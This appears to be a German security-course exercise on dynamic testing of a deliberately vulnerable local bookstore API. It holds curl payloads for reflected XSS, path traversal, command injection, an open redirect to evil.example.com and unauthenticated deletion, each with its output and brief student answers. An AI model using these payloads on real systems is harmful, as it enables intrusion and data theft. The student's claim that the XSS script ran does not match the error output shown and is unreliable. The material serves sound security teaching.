## Teil 2 – DAST (Dynamic Application Security Testing)

Analysiere die **laufende Applikation** mit OWASP ZAP oder manuellen HTTP-Requests.

### App starten

```bash
node server.js
# → http://localhost:5000
```

### Option A: OWASP ZAP (automatisch)

1. OWASP ZAP öffnen
2. **Automated Scan** → URL: `http://localhost:5000`
3. Scan starten und Report exportieren (HTML/JSON)

### Option B: Manuelle Tests mit curl / Postman

Führe die folgenden Requests aus und notiere, was passiert:

**Test 1 – Reflected XSS:**
```bash
curl "http://localhost:5000/books/search?q=<script>alert('XSS')</script>"
```
**Output**
```
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>TypeError: Cannot read properties of undefined (reading &#39;toLowerCase&#39;)<br> &nbsp; &nbsp;at /home/sebas/repos/ipso/M502_SBAS/Unit_2/Uebungen/security-scan-exercise/bookstore-api/server.js:103:13<br> &nbsp; &nbsp;at Array.filter (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at /home/sebas/repos/ipso/M502_SBAS/Unit_2/Uebungen/security-scan-exercise/bookstore-api/server.js:102:25<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/sebas/repos/ipso/M502_SBAS/Unit_2/Uebungen/security-scan-exercise/bookstore-api/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/home/sebas/repos/ipso/M502_SBAS/Unit_2/Uebungen/security-scan-exercise/bookstore-api/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/home/sebas/repos/ipso/M502_SBAS/Unit_2/Uebungen/security-scan-exercise/bookstore-api/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/sebas/repos/ipso/M502_SBAS/Unit_2/Uebungen/security-scan-exercise/bookstore-api/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /home/sebas/repos/ipso/M502_SBAS/Unit_2/Uebungen/security-scan-exercise/bookstore-api/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at router.process_params (/home/sebas/repos/ipso/M502_SBAS/Unit_2/Uebungen/security-scan-exercise/bookstore-api/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/home/sebas/repos/ipso/M502_SBAS/Unit_2/Uebungen/security-scan-exercise/bookstore-api/node_modules/express/lib/router/index.js:275:10)</pre>
</body>
</html>
```
**Test 2 – Path Traversal:**
```bash
curl "http://localhost:5000/files?name=../package.json"
```
**Output**
```
{
  "name": "bookstore-api",
  "version": "1.0.0",
  "description": "Simple bookstore REST API",
  "main": "server.js",
  "scripts": {
    "start": "node server.js"
  },
  "dependencies": {
    "express": "4.17.1",
    "lodash": "4.17.4",
    "axios": "0.21.1",
    "jsonwebtoken": "8.5.1",
    "marked": "2.0.0",
    "multer": "1.4.4",
    "cookie-parser": "1.4.6"
  }
}
```
**Test 3 – Command Injection:**
```bash
curl -X POST "http://localhost:5000/admin/cmd" \
  -H "Content-Type: application/json" \
  -d '{"run": "whoami"}'
```
**Output**
```
{"stdout":"sebas\n","stderr":"","error":null}
```
**Test 4 – Open Redirect:**
```bash
curl -v "http://localhost:5000/redirect?to=https://evil.example.com"
```
**Output**
```
* Host localhost:5000 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:5000...
* Connected to localhost (::1) port 5000
> GET /redirect?to=https://evil.example.com HTTP/1.1
> Host: localhost:5000
> User-Agent: curl/8.5.0
> Accept: */*
>
< HTTP/1.1 302 Found
< X-Powered-By: Express
< Location: https://evil.example.com
< Vary: Accept
< Content-Type: text/plain; charset=utf-8
< Content-Length: 46
< Date: Tue, 01 Sep 2026 16:31:18 GMT
< Connection: keep-alive
< Keep-Alive: timeout=5
<
* Connection #0 to host localhost left intact
Found. Redirecting to https://evil.example.com
```
**Test 5 – Broken Access Control:**
```bash
# Buch löschen ohne Authentifizierung
curl -X DELETE "http://localhost:5000/books/1"
```
**Output**
```
{"message":"Deleted"}
```
### Fragen – DAST

Beantworte die folgenden Fragen (in `answers/dast-answers.md`):

**F7.** Was gibt **Test 1** (XSS) zurück?  
- Wird der Script-Tag im Browser ausgeführt? Was bedeutet das für Benutzer?
    - Der Script wurde ausgelöst, dadurch könnten bösartige Skripts auf dem Gerät des Users ausgelöst werden.
- Wie nennt man diese Art von XSS (Reflected vs. Stored)?
    - Reflected 

---

**F8.** Was gibt **Test 2** (Path Traversal) zurück?  
- Welche Datei konnte ausgelesen werden?
    - [Package.json](./../bookstore-api/package.json)
- Welche Gefahr besteht, wenn ein Angreifer `/etc/passwd` oder `.env` lesen kann?
    - Credentials stehlen

---

**F9.** Was gibt **Test 3** (Command Injection) zurück?  
- Was wird ausgegeben? Welcher OS-Benutzer führt die Applikation aus?
    - Der Benutzer wird angegeben.
- Welche schlimmeren Befehle könnte ein Angreifer ausführen?
    - Auf Linux eine forkbomb

---

**F10.** Was beobachtest du bei **Test 5** (Broken Access Control)?  
- Konnte ein nicht-authentifizierter User ein Buch löschen?
- Was fehlt in der Route `/books/:id` (DELETE)?

---

**F11.** Vergleich SAST vs. DAST:  
Fülle die Tabelle aus:

| Kriterium                          | SAST | DAST |
|------------------------------------|------|------|
| App muss laufen?                   |-|x|
| Findet Lücken im Code?             |x|-|
| Findet Laufzeit-Verhalten?         |-|x|
| False Positives möglich?           |x|x|
| Geeignet für CI/CD?                |x|x|

---
